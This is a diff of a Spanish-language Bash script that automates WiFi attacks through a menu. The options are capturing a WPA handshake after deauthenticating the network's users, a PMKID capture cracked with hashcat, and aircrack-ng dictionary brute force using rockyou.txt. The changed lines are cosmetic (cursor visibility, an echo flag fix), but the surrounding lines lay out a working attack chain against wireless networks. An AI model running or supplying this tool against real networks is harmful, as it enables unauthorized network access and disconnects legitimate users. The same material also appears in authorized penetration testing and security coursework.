@@ -28,7 +28,7 @@ programs() {
 			echo -e "${greenColour}[+] Listo"
 		else 
 			echo -e "${redColour} [-] No instalada"
-			echo -r "${blueColour} [*] Instalando ${program}..." 
+			echo -e "${blueColour} [*] Instalando ${program}..." 
 			sudo apt-get install $program -y > /dev/null 2>&1
 		fi
 	done
@@ -87,7 +87,8 @@ else
 							echo -e "2) Ataque PKMID"
 							echo -e "3) Ataque de fuerza bruta"
 							echo -e "4) Salir"
-							echo -e "${greenColour}"; read -p "Seleccione un ataque: " opcion
+							tput cnorm
+							echo -e "${greenColour}"; read -p "Seleccione un ataque:" opcion
 							$cleancolor
 							case $opcion in
 								1)
@@ -97,8 +98,10 @@ else
 								xterm -hold -e "airodump-ng ${tar}mon" &
 								airodump_xterm_PID=$!
 								echo -e "$grayColour"
+								tput cnorm
 								read -p "[?] Que red deseas atacar?: " ap
 								read -p "[?] En que canal esta ${ap}?: " channel
+								tput civis
 								$cleancolor
 								echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
 								$cleancolor
@@ -119,9 +122,10 @@ else
 								wait $airodump_filter_xterm_PID 2>/dev/null
 								test -f Handshake-01.cap
 								if [ "$(echo $?)" == "0" ]; then
+									tput cnorm
 									echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
 									read -p "[?] Ruta del Diccionario al usar: " dicc
-									$cleancolor
+									$cleancolor; tput civis
 									xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
 
 									echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
@@ -152,9 +156,10 @@ else
 								if [ "$(echo $?)" == "0" ]; then
 									echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
 									sleep 1
+									tput cnorm
 									echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
 									read -p "[?] Ruta del Diccionario al usar: " dicc1
-									echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
+									tput civis; echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
 									hcxpcapngtool -o HPKMID.hc22000 -E essidlist HashPKMID.pcapng > /dev/null 2>&1
 									hashcat -m 22000 $dicc1 HPKMID.hc22000 -d 1 --force
 								else 
@@ -168,8 +173,9 @@ else
 								sleep 1
 								echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
 									$cleancolor
+									tput cnorm
 									read -p "[?] Nombre del archivo .cap: " cap
-									read -p "[?] Ruta del Diccionario al usar: " dicc
+									tput civis; read -p "[?] Ruta del Diccionario al usar: " dicc
 									xterm -hold -e "aircrack-ng -w $dicc $cap"
 								;;
 								4)
